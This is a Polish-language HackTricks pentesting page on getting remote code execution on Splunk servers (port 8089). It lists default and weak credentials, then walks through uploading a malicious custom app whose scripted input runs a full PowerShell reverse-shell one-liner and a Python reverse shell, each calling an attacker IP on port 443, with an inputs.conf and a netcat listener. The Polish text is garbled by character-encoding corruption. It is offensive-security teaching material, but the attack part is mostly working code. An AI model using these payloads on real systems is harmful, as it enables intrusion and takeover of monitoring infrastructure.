# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Podstawowe informacje**

Splunk to **narzdzie do analizy log贸w**, kt贸re odgrywa kluczow rol w **zbieraniu, analizowaniu i wizualizowaniu danych**. Chocia偶 jego pierwotnym celem nie byo penienie roli **SIEM (Zarzdzanie Informacjami i Zdarzeniami Bezpieczestwa)**, zyskao popularno w dziedzinie **monitorowania bezpieczestwa** i **analizy biznesowej**.

Wdro偶enia Splunk s czsto wykorzystywane do przechowywania **wra偶liwych danych** i mog stanowi **cenne 藕r贸do informacji** dla potencjalnych atakujcych, jeli uda im si skompromitowa system. **Domylny port:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
Serwer **Splunk web dziaa domylnie na porcie 8000**.
{% endhint %}

## Enumeracja

### Wersja darmowa

Wersja pr贸bna Splunk Enterprise przeksztaca si w **wersj darmow po 60 dniach**, kt贸ra **nie wymaga uwierzytelnienia**. Nie jest rzadkoci, 偶e administratorzy system贸w instaluj wersj pr贸bn Splunk, aby j przetestowa, co jest **nastpnie zapominane**. To automatycznie przeksztaca si w wersj darmow, kt贸ra nie ma 偶adnej formy uwierzytelnienia, wprowadzajc luk w zabezpieczeniach w rodowisku. Niekt贸re organizacje mog zdecydowa si na wersj darmow z powodu ogranicze bud偶etowych, nie w peni rozumiejc konsekwencje braku zarzdzania u偶ytkownikami/rolami.

### Domylne dane logowania

W starszych wersjach Splunk domylne dane logowania to **`admin:changeme`**, kt贸re s wygodnie wywietlane na stronie logowania.\
Jednak **najnowsza wersja Splunk** ustawia **dane logowania** **podczas procesu instalacji**. Jeli domylne dane logowania nie dziaaj, warto sprawdzi powszechne sabe hasa, takie jak `admin`, `Welcome`, `Welcome1`, `Password123` itp.

### Uzyskiwanie informacji

Po zalogowaniu si do Splunk mo偶emy **przeglda dane,** uruchamia **raporty**, tworzy **pulpity nawigacyjne**, **instalowa aplikacje** z biblioteki Splunkbase oraz instalowa aplikacje niestandardowe.\
Mo偶esz r贸wnie偶 uruchamia kod: Splunk ma wiele sposob贸w na **uruchamianie kodu**, takich jak aplikacje Django po stronie serwera, punkty kocowe REST, skrypty wejciowe i skrypty powiadomie. Powszechn metod uzyskiwania zdalnego wykonania kodu na serwerze Splunk jest u偶ycie skryptowanego wejcia.

Ponadto, poniewa偶 Splunk mo偶e by zainstalowany na hostach Windows lub Linux, mo偶na tworzy skrypty wejciowe do uruchamiania skrypt贸w Bash, PowerShell lub Batch.

### Shodan

* `Splunk build`

## RCE

### Tworzenie niestandardowej aplikacji

Niestandardowa aplikacja mo偶e uruchamia **skrypty Python, Batch, Bash lub PowerShell**.\
Zauwa偶, 偶e **Splunk ma zainstalowanego Pythona**, wic nawet w systemach **Windows** bdziesz m贸g uruchamia kod Pythona.

Mo偶esz u偶y [**tego**](https://github.com/0xjpuff/reverse\_shell\_splunk) pakietu Splunk, aby nam pom贸c. Katalog **`bin`** w tym repozytorium zawiera przykady dla [Pythona](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) i [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Przejd藕my przez to krok po kroku.

Aby to osign, najpierw musimy stworzy niestandardow aplikacj Splunk, u偶ywajc nastpujcej struktury katalog贸w:
```shell-session
tree splunk_shell/

splunk_shell/
 bin
 default
```
Katalog **`bin`** bdzie zawiera wszelkie **skrypty, kt贸re zamierzamy uruchomi** (w tym przypadku, **PowerShell** reverse shell), a domylny katalog bdzie mia nasz plik `inputs.conf`. Nasz reverse shell bdzie **PowerShell one-liner:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Plik [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) informuje Splunk **kt贸ry skrypt uruchomi** oraz inne warunki. Tutaj ustawiamy aplikacj jako wczon i informujemy Splunk, aby uruchamia skrypt co 10 sekund. Interwa jest zawsze w sekundach, a wejcie (skrypt) bdzie uruchamiane tylko, jeli to ustawienie jest obecne.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Potrzebujemy pliku `.bat`, kt贸ry uruchomi si, gdy aplikacja zostanie wdro偶ona i wykona jedn lini PowerShell.

Kolejnym krokiem jest wybranie `Install app from file` i przesanie aplikacji.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

Zanim przesamy zoliw aplikacj niestandardow, uruchommy nasuchiwacz za pomoc Netcat lub [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Na stronie `Upload app`, kliknij przegldaj, wybierz tarball, kt贸ry stworzylimy wczeniej i kliknij `Upload`. **Jak tylko przesyamy aplikacj**, **otrzymujemy reverse shell**, poniewa偶 status aplikacji automatycznie zmieni si na `Enabled`.

#### Linux

Jeli mielibymy do czynienia z **hostem Linux**, musielibymy **edytowa skrypt Pythona `rev.py`** przed stworzeniem tarballa i przesaniem niestandardowej zoliwej aplikacji. Reszta procesu byaby taka sama, a my uzyskalibymy poczenie reverse shell na naszym nasuchiwaczu Netcat i moglibymy ruszy do dziaania.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Eskalacja Uprawnie

Na nastpnej stronie znajdziesz wyjanienie, jak ta usuga mo偶e by nadu偶ywana do eskalacji uprawnie i uzyskania trwaoci:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Odniesienia

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na GitHubie.

</details>
{% endhint %}
